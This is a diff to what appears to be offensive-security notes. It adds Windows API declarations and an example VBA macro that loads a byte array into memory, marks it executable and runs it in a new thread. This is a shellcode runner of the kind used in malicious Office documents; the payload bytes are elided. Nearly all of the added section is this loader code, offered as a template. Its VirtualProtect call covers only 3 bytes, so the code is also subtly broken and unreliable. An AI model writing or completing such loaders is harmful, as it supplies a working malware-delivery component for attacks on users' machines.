@@ -86,4 +86,53 @@ End Enum
 `BOOL VirtualProtect(LPVOID lpAddress,SIZE_T dwSize,DWORD  flNewProtect,PDWORD lpflOldProtect);`
 ##### VBA Invoke
 `Private Declare PtrSafe Function VirtualProtect Lib "kernel32" (lpAddress As LongPtr, ByVal dwSize As LongPtr, ByVal flNewProtect As LongPtr, lpflOldProtect As LongPtr) As LongPtr`
+#### CreateThread
+##### C language
+`HANDLE CreateThread(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);`
+##### VBA Invoke
+`Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr`
+#### VBA EXMAPLE CODE
+```
+Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr
+Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr
+Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
+Private Declare PtrSafe Function VirtualProtect Lib "KERNEL32" (ByVal memAddress As LongPtr, ByVal lengthInBytes As LongPtr, ByVal newProtect As protectFlags, ByRef outOldProtect As protectFlags) As Long
+Public Enum protectFlags
+    PAGE_NOACCESS = &H1
+    PAGE_READONLY = &H2
+    PAGE_READWRITE = &H4
+    PAGE_WRITECOPY = &H8
+    PAGE_EXECUTE = &H10
+    PAGE_EXECUTE_READ = &H20
+    PAGE_EXECUTE_READWRITE = &H40
+    PAGE_EXECUTE_WRITECOPY = &H80
+    PAGE_GUARD = &H100
+    PAGE_NOCACHE = &H200
+    PAGE_WRITECOMBINE = &H400
+End Enum
 
+Sub MyMacro()
+Dim buf As Variant
+Dim addr As LongPtr
+Dim counter As Long
+Dim data As Long
+Dim res As Long
+
+Dim originalProtection As protectFlags
+Dim vpresult As Long
+
+
+buf = Array(.......)
+
+addr = VirtualAlloc(0, UBound(buf), &H3000, PAGE_READWRITE)
+
+For counter = LBound(buf) To UBound(buf)
+data = buf(counter)
+res = RtlMoveMemory(addr + counter, data, 1)
+Next counter
+
+vpresult = VirtualProtect(addr, 3, PAGE_EXECUTE_READ, originalProtection)
+res = CreateThread(0, 0, addr, 0, 0, 0)
+
+End Sub
+```
